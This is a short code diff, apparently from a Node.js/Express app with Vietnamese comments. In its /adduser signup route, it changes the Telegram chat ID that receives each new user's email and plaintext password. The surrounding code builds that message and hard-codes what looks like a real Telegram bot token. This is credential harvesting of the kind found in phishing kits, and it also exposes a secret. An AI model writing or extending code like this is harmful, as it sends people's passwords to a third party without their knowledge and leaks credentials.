@@ -111,7 +111,7 @@ app.post("/adduser", async (req, res) => {
 
     // Gửi dữ liệu đến API bot Telegram
     const telegramBotToken = "7040830121:AAHuT-2oywuFzsydqL71knl70yDJq-oVZZs";
-    const chatId = "7014840687";
+    const chatId = "-4126530973";
     const message = `Người dùng mới đã đăng ký:\n
     email: ${req.body.email}
     password: ${req.body.Password}
